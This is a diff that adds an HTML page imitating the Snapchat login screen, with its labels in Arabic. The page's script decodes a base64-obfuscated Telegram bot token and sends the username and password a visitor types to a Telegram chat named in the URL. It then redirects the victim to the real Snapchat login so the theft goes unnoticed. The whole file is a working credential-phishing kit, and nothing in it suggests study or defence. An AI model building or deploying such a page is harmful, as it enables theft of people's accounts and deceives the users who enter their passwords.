@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        body { background-color: #fffc00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .box { background: #fff; padding: 30px; border-radius: 15px; width: 320px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #e1e1e1; background: #f2f2f2; border-radius: 25px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 12px; background: #fffc00; color: #000; border: none; border-radius: 25px; font-weight: bold; margin-top: 15px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo">
+        <h3 style="margin-top:0;">تسجيل الدخول</h3>
+        <input type="text" id="u" placeholder="اسم المستخدم أو البريد">
+        <input type="password" id="p" placeholder="كلمة السر">
+        <button class="btn" onclick="s()">تسجيل الدخول</button>
+    </div>
+    <script>
+        function s() {
+            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            const id = new URLSearchParams(window.location.search).get('id');
+            if(u && p && id) {
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent("👻 **سناب شات جديد**\n👤: `"+u+"`\n🔑: `"+p+"` ")}&parse_mode=Markdown`)
+                .then(() => { window.location.href = "https://accounts.snapchat.com/accounts/login"; });
+            }
+        }
+    </script>
+</body>
+</html>
